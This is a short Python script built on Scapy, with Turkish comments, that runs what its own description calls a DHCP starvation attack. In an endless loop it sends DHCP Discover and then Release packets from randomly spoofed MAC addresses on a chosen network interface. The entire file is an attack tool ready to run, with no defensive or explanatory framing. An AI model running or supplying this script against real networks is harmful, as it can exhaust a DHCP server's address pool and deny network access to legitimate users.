from scapy.all import *
import random
import time
import argparse

def dhcp_starvation(interface):
    while True:
        # DHCP Discover paketi oluştur
        mac = RandMAC()
        dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                        IP(src="0.0.0.0", dst="255.255.255.255") / \
                        UDP(sport=68, dport=67) / \
                        BOOTP(chaddr=mac, xid=random.randint(1, 1000000000)) / \
                        DHCP(options=[("message-type", "discover"), "end"])

        # DHCP Discover paketini gönder
        sendp(dhcp_discover, iface=interface, verbose=False)

        # DHCP yanıtlarını bekle
        time.sleep(0.5)  # Bir süre bekleyin, DHCP sunucusundan yanıt almayı bekleyin

        # DHCP Release paketi oluştur
        dhcp_release = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                       IP(src="0.0.0.0", dst="255.255.255.255") / \
                       UDP(sport=68, dport=67) / \
                       BOOTP(chaddr=mac, xid=random.randint(1, 1000000000), ciaddr="0.0.0.0") / \
                       DHCP(options=[("message-type", "release"), "end"])

        # DHCP Release paketini gönder
        sendp(dhcp_release, iface=interface, verbose=False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DHCP Starvation Attack")
    parser.add_argument("-i", "--interface", type=str, help="Network interface")
    args = parser.parse_args()

    if not args.interface:
        print("Lütfen bir ağ arayüzü belirtin.")
        exit()

    dhcp_starvation(args.interface)